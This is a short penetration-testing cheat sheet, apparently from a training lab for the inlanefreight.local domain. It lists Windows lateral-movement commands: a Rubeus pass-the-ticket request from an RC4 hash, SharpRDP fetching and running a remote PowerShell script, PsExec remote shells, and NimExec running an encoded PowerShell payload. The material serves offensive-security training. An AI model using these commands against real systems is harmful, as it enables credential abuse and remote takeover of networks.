...
| `.\Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:inlanefreight.local /ptt` | Ask for TGT using specified user and RC4 hash with Rubeus |
| `.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\<USER> password=<PASS>` | Execute PowerShell command on SRV01 via RDP using SharpRDP with specified credentials |
...
| Command | Description |
|---------|-------------|
| `.\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\<USER> -p <PASS> cmd` | Execute command on remote server using PsExec |
...
| `.\NimExec -u <USER> -d inlanefreight.local -p <PASS> -t <TARGETIP> -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v` | Execute NimExec with specified user, domain, password, target, and command |
